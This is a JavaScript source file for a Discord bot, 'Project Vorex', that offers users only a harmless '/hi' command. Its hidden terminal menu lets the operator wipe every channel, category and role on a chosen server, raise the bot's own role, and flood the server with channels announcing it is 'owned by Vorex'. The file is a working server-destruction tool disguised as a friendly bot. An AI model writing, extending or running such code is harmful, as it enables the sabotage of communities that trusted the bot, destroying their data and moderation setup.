const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require('discord.js');
const express = require("express");
const readline = require('readline');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3001;

app.get("/", (req, res) => {
  res.send("Project Vorex is running!");
});

app.listen(PORT, () => {
  console.log('\n=== UPTIME ROBOT SETUP ===');
  console.log('Add this URL to UptimeRobot:');
  console.log(`🔗 https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co`);
  console.log('========================\n');
});

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildPresences,
        GatewayIntentBits.GuildMessageReactions,
        GatewayIntentBits.DirectMessages
    ],
    ws: {
        properties: {
            $browser: "Discord iOS"
        }
    }
});

const token = process.env.DISCORD_TOKEN;
const clientId = process.env.CLIENT_ID;
const guildId = process.env.GUILD_ID;

console.log('Token exists:', !!token);
console.log('Client ID exists:', !!clientId);
console.log('Token length:', token ? token.length : 0);
console.log('Token starts with:', token ? token.substring(0, 10) + '...' : 'none');

if (!token || !clientId) {
    console.error('❌ Fehler: DISCORD_TOKEN oder CLIENT_ID fehlt in den Umgebungsvariablen!');
    console.error('Lokale .env Datei erstellen oder Environment Variables auf Render setzen!');
    process.exit(1);
}

const commands = [
    new SlashCommandBuilder()
        .setName('hi')
        .setDescription('Say hi and ping the user')
];

client.on('error', (error) => {
    console.error('Discord Client Error:', error);
});

client.on('warn', (warning) => {
    console.warn('Discord Client Warning:', warning);
});

client.on('disconnect', (event) => {
    console.error(`Discord disconnected with code ${event.code}. Reason: ${event.reason}`);
});

client.once('ready', async () => {
    console.log(`\n=== BOT STARTUP ===`);
    console.log(`✅ Bot is online as ${client.user.tag}!`);
    console.log(`📊 Serving ${client.guilds.cache.size} servers`);
    console.log(`🌐 Bot User ID: ${client.user.id}`);
    console.log(`==================\n`);
    
    client.guilds.cache.forEach(guild => {
        console.log(`Server: ${guild.name} (ID: ${guild.id})`);
    });
    
    const rest = new REST({ version: '10' }).setToken(token);
    try {
        console.log('Registering Slash Commands...');
        let data;
        console.log('Registering commands globally (works on all servers).');
        data = await rest.put(
            Routes.applicationCommands(clientId),
            { body: commands }
        );
        console.log(`✅ Successfully registered ${data.length} slash commands!`);
        console.log('Registered commands:', data.map(cmd => cmd.name).join(', '));
    } catch (error) {
        console.error('Error registering commands:', error);
        if (error.requestBody) {
            console.error('Request Details:', {
                body: error.requestBody,
                code: error.code,
                status: error.status,
                method: error.method
            });
        }
    }
    
    if (!process.env.RENDER) {
        setTimeout(() => {
            startTerminalInterface();
        }, 2000);
    }
});

client.on('interactionCreate', async interaction => {
    try {
        console.log(`[interactionCreate] type=${interaction.type} guild=${interaction.guildId} command=${interaction.commandName || ''}`);
        if (!interaction.isChatInputCommand()) return;

        if (!interaction.isRepliable()) {
            console.log('Interaction is no longer valid');
            return;
        }

        if (interaction.commandName === 'hi') {
            await interaction.reply(`hi <@${interaction.user.id}>`);
        }
    } catch (error) {
        console.error('Error in interactionCreate:', error);
        await interaction.reply('Error.', { ephemeral: true });
    }
});

client.login(token);

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

function askQuestion(question) {
    return new Promise((resolve) => {
        rl.question(question, resolve);
    });
}

async function startTerminalInterface() {
    console.log('\n=== TERMINAL INTERFACE ===');
    
    const guilds = client.guilds.cache.map(guild => guild);
    if (guilds.length === 0) {
        console.log('No servers found!');
        rl.close();
        return;
    }
    
    console.log('\nAvailable servers:');
    guilds.forEach((guild, index) => {
        console.log(`${index + 1}. ${guild.name}`);
    });
    
    const serverChoice = await askQuestion('\nSelect server (number): ');
    const selectedGuild = guilds[parseInt(serverChoice) - 1];
    
    if (!selectedGuild) {
        console.log('Invalid server selection!');
        rl.close();
        return;
    }
    
    console.log(`\nSelected: ${selectedGuild.name}`);
    
    await checkBotRolePosition(selectedGuild);
    
    while (true) {
        console.log('\nAvailable commands:');
        console.log('1. Delete all channels and categories');
        console.log('2. Delete all roles');
        console.log('3. Create channels');
        console.log('4. All in One');
        console.log('5. Exit');
        
        const commandChoice = await askQuestion('\nSelect command (number): ');
        
        if (commandChoice === '1') {
            await checkBotRolePosition(selectedGuild);
            await deleteAllChannels(selectedGuild);
        } else if (commandChoice === '2') {
            await checkBotRolePosition(selectedGuild);
            await deleteAllRoles(selectedGuild);
        } else if (commandChoice === '3') {
            await checkBotRolePosition(selectedGuild);
            await createChannels(selectedGuild);
        } else if (commandChoice === '4') {
            await checkBotRolePosition(selectedGuild);
            await allInOne(selectedGuild);
        } else if (commandChoice === '5') {
            console.log('Goodbye!');
            break;
        } else {
            console.log('Invalid command selection!');
        }
    }
    
    rl.close();
}

async function deleteAllChannels(guild) {
    console.log('Deleting all channels and categories...');
    
    const channels = guild.channels.cache.filter(channel => channel.type !== 4);
    const categories = guild.channels.cache.filter(channel => channel.type === 4);
    
    const deletePromises = [];
    
    for (const [id, channel] of channels) {
        deletePromises.push(
            channel.delete().then(() => {
                console.log(`Deleted channel: ${channel.name}`);
            }).catch(error => {
                console.log(`Failed to delete channel ${channel.name}: ${error.message}`);
            })
        );
    }
    
    for (const [id, category] of categories) {
        deletePromises.push(
            category.delete().then(() => {
                console.log(`Deleted category: ${category.name}`);
            }).catch(error => {
                console.log(`Failed to delete category ${category.name}: ${error.message}`);
            })
        );
    }
    
    await Promise.all(deletePromises);
    console.log('Channel deletion completed!');
}

async function deleteAllRoles(guild) {
    console.log('Deleting all roles...');
    
    const roles = guild.roles.cache.filter(role => role.id !== guild.id && !role.managed);
    
    const deletePromises = [];
    
    for (const [id, role] of roles) {
        deletePromises.push(
            role.delete().then(() => {
                console.log(`Deleted role: ${role.name}`);
            }).catch(error => {
                console.log(`Failed to delete role ${role.name}: ${error.message}`);
            })
        );
    }
    
    await Promise.all(deletePromises);
    console.log('Role deletion completed!');
}

async function createChannels(guild) {
    const channelCount = await askQuestion('How many channels to create? ');
    const count = parseInt(channelCount);
    
    if (isNaN(count) || count <= 0) {
        console.log('Invalid number!');
        return;
    }
    
    console.log(`Creating ${count} channels...`);
    
    const createPromises = [];
    
    for (let i = 1; i <= count; i++) {
        createPromises.push(
            guild.channels.create({
                name: 'This server is owned by Vorex',
                type: 0
            }).then(() => {
                console.log(`Created channel ${i}/${count}`);
            }).catch(error => {
                console.log(`Failed to create channel ${i}: ${error.message}`);
            })
        );
    }
    
    await Promise.all(createPromises);
    console.log('Channel creation completed!');
}

async function allInOne(guild) {
    const channelCount = await askQuestion('How many channels to create after cleanup? ');
    const count = parseInt(channelCount);
    
    if (isNaN(count) || count < 0) {
        console.log('Invalid number!');
        return;
    }
    
    console.log('Starting All in One operation...');
    
    console.log('1. Deleting all roles...');
    await deleteAllRoles(guild);
    
    console.log('2. Deleting all channels and categories...');
    await deleteAllChannels(guild);
    
    if (count > 0) {
        console.log(`3. Creating ${count} channels...`);
        const createPromises = [];
        
        for (let i = 1; i <= count; i++) {
            createPromises.push(
                guild.channels.create({
                    name: 'This server is owned by Vorex',
                    type: 0
                }).then(() => {
                    console.log(`Created channel ${i}/${count}`);
                }).catch(error => {
                    console.log(`Failed to create channel ${i}: ${error.message}`);
                })
            );
        }
        
        await Promise.all(createPromises);
    }
    
    console.log('All in One operation completed!');
}

async function checkBotRolePosition(guild) {
    try {
        const botMember = await guild.members.fetchMe();
        const botRole = botMember.roles.highest;
        
        if (!botRole || botRole.id === guild.id) {
            console.log('Bot has no special role or only @everyone role.');
            return;
        }
        
        const allRoles = guild.roles.cache
            .filter(role => role.id !== guild.id && !role.managed)
            .sort((a, b) => b.position - a.position);
        
        const topRole = allRoles.first();
        
        if (topRole && topRole.id !== botRole.id) {
            console.log(`Moving bot role "${botRole.name}" to top position...`);
            
            try {
                await botRole.setPosition(0);
                console.log('✅ Bot role moved to top position!');
            } catch (error) {
                console.log(`❌ Failed to move bot role: ${error.message}`);
            }
        } else {
            console.log('✅ Bot role is already at top position!');
        }
    } catch (error) {
        console.log(`Error checking bot role position: ${error.message}`);
    }
}

